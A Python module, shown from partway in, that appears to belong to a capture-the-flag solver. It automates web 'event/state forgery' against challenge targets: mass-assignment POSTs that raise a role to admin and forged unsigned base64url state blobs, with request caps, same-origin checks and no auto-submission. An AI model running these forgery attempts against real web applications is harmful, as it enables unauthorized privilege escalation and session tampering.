        isinstance(value, str) and bool(_APPLICABLE_TEXT.search(value[:MAX_SCALAR]))
        for doc in docs for _path, value in _walk(doc)
    )

    # Event/owner fields are common in read-only records. They authorize a POST
    # only beside an unmistakable forge route or an explicit POST contract with
    # target-local unsigned/forge evidence. Prompt prose alone is not authority
    # for a generic clue-supplied feature route; the exact prompt-route fallback
    # remains below.
    if eventish and ownership and (
            explicit_forge_route or strong_forge_path
            or ("POST" in methods and (unsigned or doc_intent))):
        return True

    # An explicitly advertised state-format route is authority to read that
    # schema. A loose `state_field` alone needs POST or prompt evidence.
    if any(k in keys for k in FORMAT_ROUTE_KEYS):
        return True
    if any(k in keys for k in ("state_field", "envelope_field", "blob_field")) \
            and ("POST" in methods or prompt_intent):
        return True
    # A self-described POST role transition is enough for mass assignment, but
    # a generic current_role field is not.  Require both sides of the transition
    # and a POST method advertised by this target.
    role_values = [(key, str(value).strip().lower()) for doc in docs for path, value in _walk(doc)
                   for key in [_snake(path[-1]) if path else ""]
                   if _ROLE_KEY.search(key) and isinstance(value, (str, bool, int))]
    has_current = any(key.startswith(("current_", "existing_", "old_")) for key, _value in role_values)
    has_desired = any(key.startswith(("desired_", "target_", "new_", "required_"))
                      and (value in ("administrator", "admin", "true", "1") or "admin" in value)
                      for key, value in role_values)
    profile_route = any(key in {"profile_route", "account_route"} or re.search(
        r"(?i)(?:^|[/_.-])(?:profile|account)(?:$|[/_.-]|\d)", urllib.parse.urlsplit(value).path or "")
                        for key, value in route_rows)
    if "POST" in methods and has_current and has_desired and profile_route:
        return True
    # Prompt prose can authorize only the exact forge-like route it names; a
    # shared Mastery prompt never turns an unrelated target's feature_route into
    # a POST destination.
    named_forge_route = any(_ROUTE_WORD.search(m.group(1)) for m in _ROUTE_TEXT.finditer(prompt))
    return bool(named_forge_route and prompt_intent)


def _response(path, raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8")
        return out
    return None


def _origin(value):
    try:
        parts = urllib.parse.urlsplit(str(value or ""))
        if (parts.scheme.lower() not in ("http", "https") or not parts.hostname
                or parts.username is not None or parts.password is not None
                or parts.fragment or "@" in parts.netloc):
            return None
        return (parts.scheme.lower(), parts.hostname.rstrip(".").lower(),
                parts.port or (443 if parts.scheme.lower() == "https" else 80))
    except (TypeError, ValueError):
        return None


class _Forge:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = ctx
        try:
            self.deadline = float(ctx["deadline"]) if ctx.get("deadline") is not None \
                else time.time() + DEFAULT_SECONDS
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.requests = 0
        self.posts = 0
        self.responses = []
        # A caller that already performed recon supplies those exact
        # plain bodies so baseline values are subtracted without another request:
        # the same value cannot win, while a distinct novel payoff still can.
        # Standalone runs build the same list through get().
        self.baseline_texts = []
        supplied_baselines = list(ctx.get("baseline_texts") or [])
        for value in supplied_baselines[:40]:
            value = str(value or "")[:MAX_TEXT]
            if value and value not in self.baseline_texts:
                self.baseline_texts.append(value)
        if (len(supplied_baselines) > 40
                and BASELINE_STRICT_INCOMPLETE not in self.baseline_texts):
            self.baseline_texts.append(BASELINE_STRICT_INCOMPLETE)
        self.candidates = []
        self.success = False
        self.uuid4 = False
        self.where = None
        self.stopped = None
        self.t0 = time.time()
        self._gate = threading.Lock()
        self._stopped = False
        # the caller supplies its target-wide stop Event at the integration seam.
        # Keeping it external avoids coupling this focused module to the hunter,
        # while ensuring a Layer-1 return cannot start another forge request.
        self.external_stop = ctx.get("stop")
        self.preloaded = dict(ctx.get("preloaded") or {})
        self.client = None
        try:
            if ctx.get("client") is not None:
                candidate = ctx["client"]
                candidate_origin, target_origin = (
                    _origin(getattr(candidate, "base", None)), _origin(self.url))
                if candidate_origin is not None and candidate_origin == target_origin:
                    self.client = candidate
                else:
                    self.stopped = "client scope mismatch"
            elif callable(ctx.get("client_factory")):
                candidate = ctx["client_factory"](self.url, REQUEST_TIMEOUT)
                candidate_origin, target_origin = (
                    _origin(getattr(candidate, "base", None)), _origin(self.url))
                if candidate_origin is not None and candidate_origin == target_origin:
                    self.client = candidate
                else:
                    self.stopped = "client scope mismatch"
            else:
                self.client = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"

    def left(self):
        return None if self.deadline is None else self.deadline - time.time()

    def stop_now(self):
        # Holding the same gate as _request means no request can begin after this returns.
        with self._gate:
            self._stopped = True

    def _may_send_locked(self):
        if self._stopped:
            self.stopped = self.stopped or "stopped"
            return False
        if hasattr(self.external_stop, "is_set") and self.external_stop.is_set():
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        left = self.left()
        if left is not None and left <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _request(self, method, path, data=None, headers=None, role="plain"):
        method = str(method).upper()
        if method not in ("GET", "POST"):
            self.stopped = self.stopped or f"refused verb {method}"
            return None
        clean = _route_value(path, self.url)
        if clean is None or clean != path:
            self.stopped = self.stopped or "refused unsafe/off-host route"
            return None
        if data is not None:
            raw = data.encode("utf-8") if isinstance(data, str) else bytes(data)
            if len(raw) > MAX_POST_BODY:
                self.stopped = self.stopped or "refused oversized request body"
                self._stopped = True
                return None
        with self._gate:
            if self.client is None or not self._may_send_locked():
                return None
            left = self.left()
            try:
                self.client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            except Exception:
                pass
            self.requests += 1
            if method == "POST":
                self.posts += 1
            try:
                response = self.client.request(method, path, data=data, headers=dict(headers or {}),
                                               allow_redirects=False)
            except Exception as exc:
                self.responses.append({"method": method, "path": path.split("?", 1)[0], "status": None,
                                       "role": role, "error": type(exc).__name__})
                # Scope/VPN/transport failures are terminal for this target.  A
                # prompt-named route must never turn one failed send into dozens.
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
        self.responses.append({"method": method, "path": path.split("?", 1)[0],
                               "status": response.get("status") if isinstance(response, dict) else None,
                               "role": role})
        return response

    def get(self, path, role="plain"):
        if path in self.preloaded:
            response = _response(path, self.preloaded[path])
            if response is not None:
                text = _baseline_text(response)
                if text not in self.baseline_texts:
                    self.baseline_texts.append(text)
                return response
        response = self._request("GET", path, role=role)
        if response is not None:
            self.baseline_texts.append(_baseline_text(response))
        return response

    def post(self, route, payload, encoding, why):
        try:
            if encoding == "form":
                data = urllib.parse.urlencode(payload, doseq=False)
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
            else:
                data = json.dumps(payload, separators=(",", ":"), ensure_ascii=False)
                headers = {"Content-Type": "application/json"}
        except Exception:
            self.stopped = self.stopped or "refused unserializable request body"
            self._stopped = True
            return None, False
        if len(data.encode("utf-8")) > MAX_POST_BODY:
            self.stopped = self.stopped or "refused oversized request body"
            self._stopped = True
            return None, False
        response = self._request("POST", route, data=data, headers=headers, role="payoff")
        host = urllib.parse.urlsplit(self.url).hostname
        info = extract_success(response, self.baseline_texts, host=host) if response is not None else {
            "success": False, "auto": None, "uuid4": False, "candidates": [], "wire": [],
            "baseline_decoys": []}
        if info["success"]:
            self.success = True
            self.where = f"{why}:{encoding}"
            self._merge_candidates(info)
            if info["auto"] is not None:
                return info["auto"], "proof"
            # A future-shaped or ambiguous successful POST is terminal. Its
            # evidence is surfaced, but a follow-up GET must not override it.
            if info.get("candidates") or info.get("wire"):
                return None, "terminal"
            # A bland target-declared success may have unlocked an advertised
            # result route. It is the only case that permits readback.
            return None, "bland"
        if response is not None:
            self._add_baseline(response)
        return None, "continue"

    def _add_baseline(self, response):
        text = _baseline_text(response)
        if text and text not in self.baseline_texts:
            self.baseline_texts.append(text)

    def _merge_candidates(self, info):
        self.uuid4 = self.uuid4 or bool(info.get("uuid4"))
        for value in list(info.get("candidates") or []) + list(info.get("wire") or []):
            if value not in self.candidates:
                self.candidates.append(value)

    def readback(self, routes):
        """Read an advertised result after one successful state change."""
        host = urllib.parse.urlsplit(self.url).hostname
        autos = []
        for route in routes[:3]:
            response = self._request("GET", route, role="payoff-readback")
            if response is None:
                continue
            info = extract_success(response, self.baseline_texts, host=host)
            if not info["success"]:
                self._add_baseline(response)
                continue
            self.where = f"readback:{route.split('?', 1)[0]}"
            self._merge_candidates(info)
            if info["auto"] is not None:
                autos.append(str(info["auto"]))
            if not info.get("candidates") and not info.get("wire"):
                # A bland declared-success page is still a control for every
                # later readback. Preserve its body/headers before continuing.
                self._add_baseline(response)
            # A bland or future-shaped first readback never prevents a later
            # advertised route from returning the actual proof.
        unique = list(dict.fromkeys(value.casefold() for value in autos))
        if len(unique) == 1:
            # A distinct future-shaped candidate or second proof makes the
            # aggregate sibling set ambiguous; no route-order tie-breaking.
            distinct = {str(value).casefold() for value in self.candidates}
            if distinct <= {unique[0]}:
                return autos[0]
        elif len(unique) > 1:
            for value in autos:
                if value not in self.candidates:
                    self.candidates.append(value)
        return None

    def _docs(self, response):
        if response is None:
            return []
        try:
            views = response_text_views(response, strict=True)
        except Exception:
            return []
        documents = []
        for view in views:
            integrity = {}
            documents.extend(_security_json_objects(view, _integrity=integrity))
            if integrity.get("incomplete"):
                return []
        # Mutation authority must be one coherent document.  Combining a
        # method from one MIME/archive sibling, a route from another and a
        # sample object from a third would manufacture a contract the target
        # never actually stated.
        return documents if len(documents) == 1 else []

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        if self.client is None or self.max_requests <= 0:
            self.stopped = self.stopped or "max_requests"
            return None
        left = self.left()
        if left is not None and left <= DEADLINE_PAD:
            self.stopped = "deadline"
            return None

        # Standalone callers need the same landing-page decoy control that the
        # integrated proof hunter preloads.  At the integration seam this is a
        # zero-request cache hit.
        landing = self.get("/", "landing-control")
        if isinstance(landing, dict) and landing.get("status") == 410:
            self.stopped = "completed"
            return None
        clue_response = self.get("/api/clues", "clues")
        clue_ok = (isinstance(clue_response, dict) and isinstance(clue_response.get("status"), int)
                   and 200 <= clue_response["status"] < 300)
        # A JSON-shaped 404/500 is an error body, never authority to POST. An
        # exact route in the saved target-local prompt can still authorize the
        # class without a clue document below.
        docs = self._docs(clue_response) if clue_ok else []
        prompt = "\n".join(str(x or "") for x in (self.ctx.get("prompt"), self.ctx.get("question"),
                                                    self.target.get("question")))
        format_route = _format_route(docs, self.url)
        if format_route is _ROUTE_CONFLICT:
            self.stopped = "conflicting state-format route aliases"
            return None
        advertised_format = format_route is not None
        blob_prompt = bool(re.search(r"(?i)\b(?:serialized|base64url|session blob|state blob|blob of)\b", prompt))
        if format_route is None and blob_prompt:
            format_route = "/api/state-format"
        format_docs = []
        if format_route:
            format_response = self.get(format_route, "state-format")
            if (isinstance(format_response, dict) and isinstance(format_response.get("status"), int)
                    and 200 <= format_response["status"] < 300):
                format_docs = self._docs(format_response)
            docs += format_docs

        blob_evidence = _blob_evidence(format_docs or docs, prompt, advertised_format=advertised_format)
        if not _applicable(docs, prompt) and not (format_docs and blob_evidence):
            self.stopped = "not a self-described forge class"
            return None
        methods, methods_ok = _methods(docs)
        if not methods_ok:
            self.stopped = "conflicting method aliases"
            return None
        if methods and "POST" not in methods:
            self.stopped = "target advertises no POST method"
            return None

        routes = _routes(docs, self.target, self.ctx, self.url, format_docs=format_docs)
        if not routes:
            self.stopped = "no advertised or prompt-named forge route"
            return None
        route = routes[0]
        state_docs = format_docs or docs
        if blob_evidence and _unsafe_state_sample(state_docs):
            self.stopped = "unsafe advertised state sample"
            return None
        readback_values = _readback_routes(docs, self.url)
        if readback_values is None:
            self.stopped = "invalid or over-broad readback route set"
            return None
        readbacks = [r for r in readback_values if r != route]
        # GET-first control.  It is also the baseline that prevents an already-visible proof from being claimed.
        self.get(route, "feature-control")
        for readback in readbacks:
            self.get(readback, "readback-control")

        specs = _scalar_specs(docs)
        role_labels = {spec["label"] for spec in specs if _ROLE_KEY.search(spec["label"])}
        allow_role_only = blob_evidence or (
            any(label.startswith(("current_", "existing_", "old_")) for label in role_labels)
            and any(label.startswith(("desired_", "target_", "new_", "required_")) for label in role_labels)
        )
        flat = _flat_payloads(specs, allow_role_only=allow_role_only)
        samples = _sample_objects(state_docs) if blob_evidence else []
        envelope_names = _envelope_names(state_docs) if blob_evidence else []
        blobs = []
        if blob_evidence:
            for state in _mutated_states(samples):
                for envelope in envelope_names:
                    encoded = _b64url_json(state)
                    if encoded is not None:
                        blobs.append(({envelope: encoded}, f"base64url:{envelope}"))
            blobs = blobs[:16]

        attempts = []
        preferred = _preferred_encoding(docs)
        alternate = "form" if preferred == "json" else "json"
        if blobs:
            # One unsigned flat mass-assignment try first, then obey the advertised blob format.
            attempts += [(p, preferred, why) for _key, p, why in flat[:1]]
            attempts += [(p, "json", why) for p, why in blobs]
            attempts += [(p, preferred, why) for _key, p, why in flat[1:32]]
            attempts += [(p, alternate, why) for _key, p, why in flat[:6]]
        else:
            attempts += [(p, preferred, why) for _key, p, why in flat[:36]]
            attempts += [(p, alternate, why) for _key, p, why in flat[:6]]
        # Nested objects are deliberately after the useful flat encodings.
        for _key, payload, why in flat[:6]:
            for envelope in ("event", "payload", "data", "state"):
                attempts.append(({envelope: payload}, "json", f"nested:{envelope}:{why}"))

        seen = set()
        for payload, encoding, why in attempts:
            if self.posts >= MAX_POSTS:
                self.stopped = self.stopped or "max_posts"
                break
            try:
                key = encoding + ":" + json.dumps(payload, sort_keys=True, separators=(",", ":"), default=str)
            except Exception:
                continue
            if key in seen:
                continue
            seen.add(key)
            proof, outcome = self.post(route, payload, encoding, why)
            if outcome == "proof":
                return proof
            if outcome == "terminal":
                return None
            if outcome == "bland":
                # Never repeat a state change after target-declared success.
                # Try at most three advertised result routes using the same jar.
                return self.readback(readbacks or [route])
            if self._stopped or self.stopped in ("deadline", "max_requests", "stopped"):
                break
        self.stopped = self.stopped or "no successful forge"
        return None

    def summary(self, proof):
        return {"proof": proof, "success": self.success, "candidates": list(dict.fromkeys(self.candidates))[:12],
                "uuid4": self.uuid4, "requests": self.requests, "posts": self.posts,
                "baseline_incomplete": baseline_set_incomplete(self.baseline_texts),
                "seconds": round(time.time() - self.t0, 3), "where": self.where, "stopped": self.stopped,
                "responses": self.responses[:80]}


def _append_evidence(ctx, line):
    evidence = ctx.get("evidence")
    if isinstance(evidence, list):
        line = _web.safe_display_text(line, 600)
        lock = ctx.get("_evidence_lock")
        if hasattr(lock, "__enter__"):
            with lock:
                evidence.append(line)
        else:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target.  Never raises and never submits."""
    ctx = dict(ctx or {})
    runner = _Forge(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    summary = runner.summary(proof)
    if runner.candidates:
        aid = runner.target.get("answer_id") or "target"
        for value in list(dict.fromkeys(runner.candidates))[:6]:
            _append_evidence(ctx, f"WEB FORGE CANDIDATE {aid}: {value} (successful response; not auto-submitted)")
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[runner.target.get("answer_id") or "target"] = summary
    # Keep the single-target contract as observable as solve_targets().  The web
    # agent uses solve() during focused follow-up, and a new-format candidate is
    # useful only if it survives in the attempt log as well as stderr/evidence.
    logged_target = dict(runner.target)
    logged_target.setdefault("answer_id", "target")
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), [logged_target],
               {logged_target["answer_id"]: summary})
    return proof


def solve_targets(targets, ctx=None):
    """Run targets concurrently behind one deadline.  No request begins after this function returns."""
    try:
        ctx = dict(ctx or {})
        valid = [dict(t) for t in list(targets or []) if isinstance(t, dict) and t.get("answer_id") and t.get("url")]
    except Exception:
        return {}
    results = {}
    summaries = {}
    runners = {}
    lock = threading.Lock()
    evidence_lock = threading.Lock()
    ctx["_evidence_lock"] = evidence_lock

    def one(target):
        aid = target["answer_id"]
        local = dict(ctx)
        local["result_sink"] = summaries
        runner = _Forge(target, local)
        with lock:
            runners[aid] = runner
        try:
            proof = runner.run()
        except Exception as exc:
            runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
            proof = None
        with lock:
            results[aid] = proof
            summaries[aid] = runner.summary(proof)
        if runner.candidates:
            for value in list(dict.fromkeys(runner.candidates))[:6]:
                _append_evidence(ctx, f"WEB FORGE CANDIDATE {aid}: {value} (successful response; not auto-submitted)")

    threads = [threading.Thread(target=one, args=(target,), name=f"forge-event-{target['answer_id']}", daemon=True)
               for target in valid]
    for thread in threads:
        thread.start()
    deadline = None
    try:
        deadline = float(ctx["deadline"]) if ctx.get("deadline") is not None else None
    except (TypeError, ValueError):
        pass
    for thread in threads:
        thread.join(timeout=None if deadline is None else max(0.0, deadline - time.time()))
    # stop_now takes each runner's send gate.  An in-flight request finishes first; after stop_now returns,
    # the worker cannot begin another request.  WebClient's timeout was capped to the deadline.
    for runner in list(runners.values()):
        runner.stop_now()
    for thread in threads:
        thread.join(timeout=REQUEST_TIMEOUT + 0.5)
    for target in valid:
        aid = target["answer_id"]
        results.setdefault(aid, None)
        if aid in runners:
            summaries[aid] = runners[aid].summary(results[aid])
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), valid, summaries)
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink.update(summaries)
    return results


def _write_log(log_dir, challenge, targets, summaries):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        at = _dt.datetime.now().astimezone().isoformat(timespec="seconds")
        with (folder / "forge_event.jsonl").open("a", encoding="utf-8") as handle:
            for target in targets:
                aid = target["answer_id"]
                row = {"at": at, "challenge": challenge, "answer_id": aid, "index": target.get("index")}
                row.update(summaries.get(aid) or {"proof": None, "stopped": "no result"})
                handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass


def targets_from_start(start):
    targets = [t for t in (start.get("targets") or []) if isinstance(t, dict) and t.get("url")]
    questions = [q for q in (start.get("questions") or []) if isinstance(q, dict)]
    answer_ids = start.get("answer_ids") or [q.get("id") for q in questions]
    urls = [t["url"] for t in targets]
    by_id = {str(t.get("id")): t["url"] for t in targets if t.get("id")}
    out = []
    for i, (aid, question) in enumerate(zip(answer_ids, questions), 1):
        if not aid:
            continue
        artifact = str(question.get("artifact") or "")
        url = by_id.get(artifact)
        match = re.search(r"Target\s+(\d+)", artifact + " " + str(question.get("question") or ""))
        index = int(match.group(1)) if match else i
        if url is None and 1 <= index <= len(urls):
            url = urls[index - 1]
        if url:
            out.append({"answer_id": str(aid), "url": url, "index": index,
                        "question": str(question.get("question") or "")})
    if not out:
        for i, target in enumerate(targets, 1):
            out.append({"answer_id": str(target.get("answer_id") or f"proof-{i}"), "url": target["url"],
                        "index": i, "question": ""})
    return out


def _find_start(challenge):
    root = ctf_paths.workdir()
    base = challenge.split("/", 1)[0]
    mode = challenge.split("/", 1)[1] if "/" in challenge else None
    for day in sorted(root.glob("day-*")):
        folder = day / base
        if mode:
            folder = folder / mode
        path = folder / "start.json"
        if path.is_file():
            try:
                return json.loads(path.read_text(encoding="utf-8")), folder
            except Exception:
                return None, folder
    return None, None


def main(argv=None):
    import argparse

    parser = argparse.ArgumentParser(description="bounded simplest-first event/state forgery (submits nothing)")
    parser.add_argument("challenge", nargs="?")
    parser.add_argument("--target", action="append", default=[], metavar="ANSWER_ID=URL")
    parser.add_argument("--seconds", type=float, default=45.0)
    parser.add_argument("--max-requests", type=int, default=DEFAULT_MAX_REQUESTS)
    args = parser.parse_args(argv)
    targets, folder, prompt = [], None, ""
    if args.target:
        for i, spec in enumerate(args.target, 1):
            aid, sep, url = spec.partition("=")
            if sep and aid and url:
                targets.append({"answer_id": aid, "url": url, "index": i, "question": ""})
    elif args.challenge:
        start, folder = _find_start(args.challenge)
        if isinstance(start, dict):
            targets = targets_from_start(start)
            prompt = str(start.get("prompt") or "")
    if not targets:
        parser.error("no targets; pass a saved challenge id or --target ANSWER_ID=URL")
    evidence = []
    result_meta = {}
    answers = solve_targets(targets, {"deadline": time.time() + max(0.0, args.seconds),
                                      "max_requests": max(0, args.max_requests),
                                      "log_dir": str(folder / "forge_event") if folder else None,
                                      "challenge": args.challenge, "prompt": prompt,
                                      "evidence": evidence, "result_sink": result_meta})
    print(json.dumps(answers, sort_keys=True))
    for line in evidence:
        print(line, file=sys.stderr)
    for aid, meta in result_meta.items():
        print(f"WEB FORGE {aid}: requests={meta.get('requests')} posts={meta.get('posts')} "
              f"success={meta.get('success')} stopped={meta.get('stopped')}", file=sys.stderr)
    return 0 if any(answers.values()) else 2


if __name__ == "__main__":
    raise SystemExit(main())
